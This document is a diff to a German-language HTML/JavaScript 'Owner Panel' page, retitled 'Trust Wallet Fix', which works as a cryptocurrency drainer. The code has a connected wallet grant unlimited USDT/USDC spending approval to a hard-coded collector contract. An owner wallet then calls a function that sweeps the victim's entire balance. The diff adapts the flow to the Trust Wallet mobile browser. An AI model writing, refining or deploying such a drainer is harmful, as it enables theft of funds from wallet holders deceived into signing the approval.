@@ -3,22 +3,21 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Owner Panel – Multi-Token Collector</title>
+  <title>Owner Panel – Trust Wallet Fix</title>
   <style>
     body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:16px; }
     .box{ background:#020617; padding:25px; border-radius:16px; width:420px; box-shadow:0 20px 50px rgba(0,0,0,.5); border: 1px solid #1e293b; }
     h2{ margin-top:0; text-align: center; color: #f8fafc; }
     .step { background: #1e293b; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
-    .step-title { font-weight: bold; font-size: 12px; color: #3b82f6; text-transform: uppercase; margin-bottom: 10px; display: flex; justify-content: space-between; }
+    .step-title { font-weight: bold; font-size: 12px; color: #3b82f6; text-transform: uppercase; margin-bottom: 10px; }
     select, button { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
     select { background: #334155; color: white; margin-bottom: 10px; }
     button { background:#22c55e; color: white; margin-top: 8px; }
-    button:hover { opacity: 0.9; transform: translateY(-1px); }
+    button:hover { opacity: 0.9; }
     button.secondary { background:#475569; }
     button.warning { background: #f59e0b; }
-    .mono { font-family: 'Courier New', monospace; font-size:11px; background: #000; padding: 6px; border-radius: 4px; display: block; color: #10b981; word-break: break-all; margin-top: 5px; }
-    .balance-tag { background: #064e3b; color: #34d399; padding: 2px 6px; border-radius: 4px; font-size: 11px; }
-    #status { margin-top:15px; padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; font-weight: 500; min-height: 20px; }
+    .mono { font-family: monospace; font-size:11px; background: #000; padding: 6px; border-radius: 4px; display: block; color: #10b981; word-break: break-all; margin-top: 5px; }
+    #status { margin-top:15px; padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; font-weight: 500; }
     .status-info { background: rgba(59, 130, 246, 0.1); color: #60a5fa; }
     .status-err { background: rgba(239, 68, 68, 0.2); color: #f87171; }
     .status-ok { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
@@ -27,20 +26,22 @@
 <body>
 
 <div class="box">
-  <h2>Owner Panel</h2>
+  <h2>Owner Panel Mobile</h2>
 
   <div class="step">
-    <div class="step-title">1. Token-Typ wählen</div>
+    <div class="step-title">1. Token & Netzwerk</div>
     <select id="tokenType" onchange="checkBalance()">
       <option value="USDT">USDT (Tether)</option>
       <option value="USDC">USDC (Circle)</option>
     </select>
+    <div id="netInfo" style="font-size:10px; opacity:0.6;">Netzwerk: Prüfen...</div>
   </div>
 
   <div class="step">
-    <div class="step-title">2. Quelle (Wallet A) <span id="balanceVal" class="balance-tag" style="display:none;">0.00</span></div>
-    <button class="secondary" onclick="connectA()">Wallet A verbinden</button>
+    <div class="step-title">2. Quelle (Wallet A)</div>
+    <button class="secondary" onclick="connectA()">Wallet verbinden</button>
     <span class="mono" id="addrA">Nicht verbunden</span>
+    <div id="balanceVal" style="font-size:12px; margin-top:5px; color:#34d399; font-weight:bold; display:none;">Guthaben: 0.00</div>
   </div>
 
   <div class="step">
@@ -49,18 +50,18 @@
   </div>
 
   <div class="step" style="border-left-color: #22c55e;">
-    <div class="step-title">4. Transfer auslösen</div>
-    <button onclick="executeCollect()">Alles einziehen</button>
+    <div class="step-title">4. Transfer</div>
+    <button onclick="executeCollect()">Einzug starten</button>
   </div>
 
-  <div id="status" class="status-info">Bereit zur Verbindung</div>
+  <div id="status" class="status-info">Warte auf Verbindung...</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
 <script>
   const COLLECTOR_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
   const TOKEN_MAP = {
-    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum Mainnet
+    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
   };
 
@@ -79,6 +80,21 @@
     s.className = "status-" + type;
   }
 
+  async function checkNetwork() {
+    if (!window.ethereum) return;
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const net = await provider.getNetwork();
+    const info = document.getElementById("netInfo");
+    // Ethereum Mainnet ChainId ist 1
+    if (net.chainId === 1n) {
+      info.innerText = "Netzwerk: ✅ Ethereum Mainnet";
+      info.style.color = "#4ade80";
+    } else {
+      info.innerText = "Netzwerk: ⚠️ Falsches Netz (Bitte ETH wählen)";
+      info.style.color = "#f87171";
+    }
+  }
+
   async function checkBalance() {
     if(!walletA) return;
     try {
@@ -88,58 +104,75 @@
       const bal = await contract.balanceOf(walletA);
       const dec = await contract.decimals();
       const formatted = ethers.formatUnits(bal, dec);
-      const badge = document.getElementById("balanceVal");
-      badge.innerText = parseFloat(formatted).toFixed(2) + " " + symbol;
-      badge.style.display = "inline";
+      const display = document.getElementById("balanceVal");
+      display.innerText = "Guthaben: " + parseFloat(formatted).toFixed(2) + " " + symbol;
+      display.style.display = "block";
     } catch(e) { console.error(e); }
   }
 
   async function connectA() {
-    if(!window.ethereum) return alert("MetaMask installieren!");
+    if(!window.ethereum) {
+      log("❌ Bitte im Trust Wallet Browser öffnen", "err");
+      return;
+    }
     try {
+      log("Verbindung wird angefragt...");
       const provider = new ethers.BrowserProvider(window.ethereum);
-      const accts = await provider.send("eth_requestAccounts", []);
-      walletA = accts[0];
+      
+      // Trust Wallet spezifischer Fix: Erzwingt das Popup
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      
+      const signer = await provider.getSigner();
+      walletA = await signer.getAddress();
+      
       document.getElementById("addrA").innerText = walletA;
+      await checkNetwork();
       await checkBalance();
-      log("✅ Wallet A verbunden", "ok");
-    } catch(e) { log("❌ Verbindung abgebrochen", "err"); }
+      log("✅ Verbunden", "ok");
+    } catch(e) { 
+      console.error(e);
+      log("❌ Verbindung fehlgeschlagen", "err"); 
+    }
   }
 
   async function approveToken() {
-    if(!walletA) return log("❌ Erst Wallet A verbinden", "err");
+    if(!walletA) return log("❌ Erst verbinden!", "err");
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       const symbol = document.getElementById("tokenType").value;
       const token = new ethers.Contract(TOKEN_MAP[symbol], ERC20_ABI, signer);
       
-      log(`Bitte Approve für ${symbol} bestätigen...`);
+      log(`Freigabe für ${symbol} bestätigen...`);
       const tx = await token.approve(COLLECTOR_ADDR, ethers.MaxUint256);
+      log("Warte auf Bestätigung...");
       await tx.wait();
-      log("✅ Freigabe erteilt!", "ok");
-    } catch(e) { log("❌ Freigabe gescheitert", "err"); }
+      log("✅ Freigabe erfolgreich!", "ok");
+    } catch(e) { log("❌ Freigabe abgelehnt", "err"); }
   }
 
   async function executeCollect() {
-    if(!walletA) return log("❌ Wallet A fehlt", "err");
+    if(!walletA) return log("❌ Keine Wallet", "err");
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       const current = await signer.getAddress();
       
       if(current.toLowerCase() === walletA.toLowerCase()) {
-        return log("⚠️ Jetzt in MetaMask zur OWNER-Wallet wechseln!", "err");
+        return log("⚠️ Zu OWNER-Wallet wechseln!", "err");
       }
 
       const collector = new ethers.Contract(COLLECTOR_ADDR, COLLECTOR_ABI, signer);
-      log("Starte Einzug...");
+      log("Sende Transaktion...");
       const tx = await collector.collectUSDTAll(walletA);
       await tx.wait();
-      log("✅ Erfolg! USDT/USDC an Treasury gesendet", "ok");
+      log("✅ Transfer erfolgreich!", "ok");
       await checkBalance();
-    } catch(e) { log("❌ Fehler: Kein Owner-Recht?", "err"); }
+    } catch(e) { log("❌ Fehler beim Transfer", "err"); }
   }
+
+  // Initialer Check
+  if(window.ethereum) checkNetwork();
 </script>
 </body>
 </html>
